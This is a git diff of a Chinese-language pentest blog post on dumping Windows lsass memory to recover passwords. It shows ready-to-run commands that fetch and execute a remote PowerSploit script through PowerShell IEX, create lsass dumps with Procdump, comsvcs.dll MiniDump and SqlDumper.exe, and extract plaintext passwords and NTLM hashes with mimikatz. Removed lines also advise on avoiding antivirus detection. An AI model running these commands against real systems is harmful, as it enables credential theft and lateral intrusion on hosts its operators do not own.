@@ -50,19 +50,31 @@ topics = ["Pentest"]
 ![得到密码2](/img/post/privilge_escalation_win_getpass2.png)
 
 * 导出NTLM Hash本地得到密码  
-    若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀
-    * 导出文件dmp文件  
-        * 上传Procdump.exe导出
+    若 mimikatz 和 getpass 这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密
+    * 导出文件 hash 文件  
+        * 上传 Procdump.exe 导出
 
         > ```
         Procdump.exe -accepteula -ma lsass.exe lsass.dmp
         ```
 
-        * 或者执行PowerShell导出
+        * 或者执行 PowerShell 导出
 
         > ```
         powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); "Get-Process lsass | Out-Minidump"
+
+        或者
+        tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
+        powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full"
         ```
+
+        * 或者用 SqlDumper.exe 导出
+
+        > ```
+        tasklist /svc |findstr lsass.exe #查看 lsass.exe 的 pid
+        "C:\Program Files\Microsoft SQL Server\100\Shared\SqlDumper.exe" <pid> 0 0x01100
+        ```
+
     * 下载导出的dmp文件后用本地mimikatz解密  
         先输入：```mimikatz.exe "sekurlsa::minidump lsass.dmp"```  
         后输入：sekurlsa::logonpasswords
